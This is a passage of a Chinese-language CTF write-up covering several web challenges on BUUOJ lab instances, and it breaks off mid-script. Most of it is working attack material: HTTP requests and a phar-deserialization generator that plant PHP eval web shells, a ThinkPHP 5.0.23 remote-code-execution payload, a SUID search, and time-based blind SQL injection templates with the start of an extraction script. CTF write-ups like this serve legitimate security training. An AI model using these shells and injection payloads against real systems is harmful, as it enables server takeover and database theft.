</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>God</span><span class=o>==</span><span class=s1>&#39;true&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span><span class=o>==</span><span class=s1>&#39;admin&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eating</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Get Out!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>                 
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;pear&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;apple&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// $Eden=new story();
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$pear</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;pear&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$Adam</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;apple&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$pear</span><span class=p>,</span><span class=nx>urldecode</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_exists</span><span class=p>(</span><span class=nv>$Adam</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;多吃雪梨&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=nx>多吃雪梨</span>
</span></span></code></pre></td></tr></table></div></div><p>绕过wakeup就可以任意执行命令了，通过<code>file_put_contents</code>写入，但是有很明显的非预期</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/pairing.php?pear=/var/www/html/shell.php&amp;apple=1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>looklook=pairing.php</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b
</span></span></code></pre></td></tr></table></div></div><p>预期的话就是修改属性数量去绕过wakeup实现getshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>story</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$eating</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$God</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$user</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=nv>$pass</span> <span class=o>=</span> <span class=k>null</span><span class=p>,</span> <span class=nv>$eating</span> <span class=o>=</span> <span class=s2>&#34;echo &#39;&lt;?php @eval(</span><span class=se>\$</span><span class=s2>_POST[1]);&#39; &gt; /var/www/html/test.php&#34;</span><span class=p>,</span> <span class=nv>$God</span> <span class=o>=</span> <span class=s1>&#39;true&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>user</span>   <span class=o>=</span> <span class=nv>$user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>pass</span>   <span class=o>=</span> <span class=nv>$pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eating</span> <span class=o>=</span> <span class=nv>$eating</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>God</span>    <span class=o>=</span> <span class=nv>$God</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>story</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s1>&#39;phar.jpg&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s1>&#39;test.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>rename</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;phar.jpg&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gzip</span><span class=o>,</span> <span class=nn>urllib.parse</span><span class=o>,</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://87f4ec66-e850-47fc-a734-116600759b85.node5.buuoj.cn:81/pairing.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8083&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8083&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;phar.jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>data</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>fixed</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>compressed</span> <span class=o>=</span> <span class=n>gzip</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>fixed</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>encoded</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote_from_bytes</span><span class=p>(</span><span class=n>compressed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pear_path</span> <span class=o>=</span> <span class=s2>&#34;/var/www/html/a.jpg&#34;</span>
</span></span><span class=line><span class=cl><span class=n>apple_path</span> <span class=o>=</span> <span class=s2>&#34;phar:///var/www/html/a.jpg/test.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>params</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;pear&#34;</span><span class=p>:</span> <span class=n>pear_path</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;apple&#34;</span><span class=p>:</span> <span class=n>apple_path</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=sa>f</span><span class=s2>&#34;?pear=</span><span class=si>{</span><span class=n>pear_path</span><span class=si>}</span><span class=s2>&amp;apple=</span><span class=si>{</span><span class=n>apple_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>encoded</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/newstarctf-2023-public-track/PixPin_2025-08-09_17-36-14.png width=1639 height=793 srcset="/p/newstarctf-2023-public-track/PixPin_2025-08-09_17-36-14_hu_c3aae665ca392fb5.png 480w, /p/newstarctf-2023-public-track/PixPin_2025-08-09_17-36-14_hu_ef015d7148ad958d.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=206 data-flex-basis=496px></p><h2 id=final>Final</h2><p>TP5.0.23RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/index.php?s=captcha</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>181</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/index.php?s=captcha</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://95af1bf0-0fa0-4f79-b2c7-1adb644eb30d.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>181</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#39;&lt;?php%20eval($_POST[1]);?&gt;&#39;%20&gt;%20/var/www/public/shell.php
</span></span></code></pre></td></tr></table></div></div><p>链接上来发现没有权限读取根目录的flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -user root -perm -4000 -print 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cp <span class=s2>&#34;/flag_dd3f6380aa0d&#34;</span> /dev/stdout
</span></span></code></pre></td></tr></table></div></div><h2 id=final-round>Final round</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/comments.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>12</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name=1%0band%0bif(ascii(substr(database(),1,1))&gt;80,sleep(3),1)
</span></span></code></pre></td></tr></table></div></div><p>成功延时，写脚本的时候发现误导很多，他有很多表和列，最后的时候还不能直接查text，不然应该会更快点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://bdca54d0-4290-4e38-bd20-a9bc6eb03661.node5.buuoj.cn:81/comments.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>SLEEP</span><span class=p>,</span> <span class=n>TH</span> <span class=o>=</span> <span class=mi>3</span><span class=p>,</span> <span class=mf>2.2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr(database(),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># wfy</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;wfy&#39;)),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># wfy_admin,wfy_comments,wfy_information</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;wfy_admin&#39;),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Id,username,password,cookie</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;wfy_comments&#39;),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># id,text,user,name,display</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(id)%0bfrom%0bwfy.wfy_comments),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># 1,2,3,4,5,6,7,8,9,10,11,100</span>
</span></span><span class=line><span class=cl><span class=c1># tpl = &#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(user)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),{i},1))&gt;{mid},sleep({SLEEP}),1)&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># f1ag_is_here</span>
</span></span><span class=line><span class=cl><span class=n>tpl</span> <span class=o>=</span> <span class=s2>&#34;1%0band%0bif(ascii(substr((select%0bgroup_concat(text)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),</span><span class=si>{i}</span><span class=s2>,1))&gt;</span><span class=si>{mid}</span><span class=s2>,sleep(</span><span class=si>{SLEEP}</span><span class=s2>),1)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sess</span><span class=o>.</span><span class=n>trust_env</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
